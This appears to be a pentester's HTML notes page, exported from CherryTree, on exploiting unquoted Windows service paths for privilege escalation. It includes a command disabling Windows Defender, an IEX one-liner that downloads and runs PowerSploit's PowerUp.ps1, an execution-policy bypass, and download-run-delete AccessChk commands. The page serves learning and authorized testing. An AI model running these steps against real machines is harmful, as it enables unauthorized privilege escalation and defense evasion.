<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>2. Check if we have enough privileges</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>2. Check if we have enough privileges</h1><br /><strong>2. Manually check Unquoted path for a
      specific service</strong><br />We can use the <strong>sc (Service Control)</strong> command with the “qc” (Show
    Config) option to query a specific service, and manually check for an unquoted path<br />
    <div class="codebox">
      <div class="codebox">C:\Users\danie\Desktop&gt;&nbsp;sc&nbsp;qc&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>service<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /><a href=""><img src="images/854-1.png" alt="images/854-1.png" /></a><br />In this case we have different
    possibilities, we can drop our payload as:<br /> C:\Program.exe<br /> C:\Program Files\Alcohol.exe<br /> C:\Program
    Files\Alcohol Soft\Alcohol.exe<br /><br /><strong>3. If we have access locally to the remote machine</strong><br />
    We can find and modify the path, by adding and removing the quotes, under:<br />
    <div class="codebox">
      <div class="codebox">HKLM\SYSTEM\CurrentControlSet\Services\&lt;service&gt;\ImagePath</div>
    </div><br /> example:<br /> HKLM\SYSTEM\CurrentControlSet\Services\&lt;AxAutoMntSrv&gt;\ImagePath<br /> <a
      href=""><img src="images/854-2.png" alt="images/854-2.png" /></a><br /><br />4. <strong>We need to know if we have
      enough privileges to restart the service </strong> &lt;------------<br /> If we can start and stop the service we
    have enough privileges to manipulate the service and we can continue with our exploitation<br /> ◇
    <strong>AccessChk</strong>:<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&nbsp;/accepteula&nbsp;-ucqv&nbsp;$env:username&nbsp;AxAutoMntSrv&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Eula.txt&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;
      </div>
    </div><br /> To stop and start a service we need one of the following:<br /> - SERVICE_ALL_ACCESS<br /> <a
      href=""><img src="images/854-3.png" alt="images/854-3.png" /></a><br /> - SERVICE_START and SERVICE_STOP<br /> <a
      href=""><img src="images/854-4.png" alt="images/854-4.png" /></a><br /> ◇ <strong>sc</strong>:<br />
    <div class="codebox">
      <div class="codebox">
        C:\Users\danie\Desktop&gt;&nbsp;sc&nbsp;start&nbsp;&lt;service&gt;<br />C:\Users\danie\Desktop&gt;&nbsp;sc&nbsp;stop&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>service<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> <a href=""><img src="images/854-5.png" alt="images/854-5.png" /></a><br /> <a href=""><img
        src="images/854-6.png" alt="images/854-6.png" /></a><br /> ◇ <strong>powerup.ps1</strong>:<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;Set-MpPreference&nbsp;-DisableRealtimeMonitoring&nbsp;$true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Disable&nbsp;Windows&nbsp;Defender<br />PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&nbsp;&#39;);&nbsp;Get-UnquotedService&nbsp;-Verbose
      </div>
    </div><br /> <a href=""><img src="images/854-7.png" alt="images/854-7.png" /></a><br /> ◇ ALTERNATIVE:<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;powershell.exe&nbsp;-exec&nbsp;bypass&nbsp;-Command&nbsp;&quot;&amp;&nbsp;{Import-Module&nbsp;.\PowerUp.ps1;&nbsp;Get-UnquotedService&nbsp;-Verbose}&quot;
      </div>
    </div><br /><br />5<strong>. Check write permissions on the directory </strong><br /> Check for write permissions on
    each directory in the existing binary path:<br /> ▪ C:\<br /> ▪ C:\Program Files\<br /> ▪ C:\Program Files\Unquoted
    Path Service<br /> ▪ C:\Program Files\Unquoted Path Service\Common Files<br /> Until we do not find a path where we
    have write permissions<br /> ◇ <strong>icacls</strong>:<br />
    <div class="codebox">
      <div class="codebox">
        C:\Program&nbsp;Files\Alcohol&nbsp;Soft&gt;&nbsp;icacls&nbsp;&quot;C:\Program&nbsp;Files&nbsp;(x86)\Alcohol&nbsp;Soft&quot;
      </div>
    </div><br /> <a href=""><img src="images/854-8.png" alt="images/854-8.png" /></a><br /> If the SID <span
      style="text-decoration:underline;">BUILTIN\Users</span> or <span
      style="text-decoration:underline;">Everyone</span> has <span style="color:#ff8700;">Modify (M)</span> or <span
      style="color:#ff8700;">Full Control(F)</span> permissions on the directory we can go ahead<br /> To check the
    meaning of the different SID: <a
      href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows" target="_blank">https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows</a><br />
    ◇ <strong>AccessChk</strong>:<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&nbsp;/accepteula&nbsp;-uwdq&nbsp;&#39;C:\Program&nbsp;Files&nbsp;(x86)\Alcohol&nbsp;Soft&#39;&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Eula.txt&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;
      </div>
    </div><br /> <a href=""><img src="images/854-9.png" alt="images/854-9.png" /></a><br />
  </div>
</body>

</html>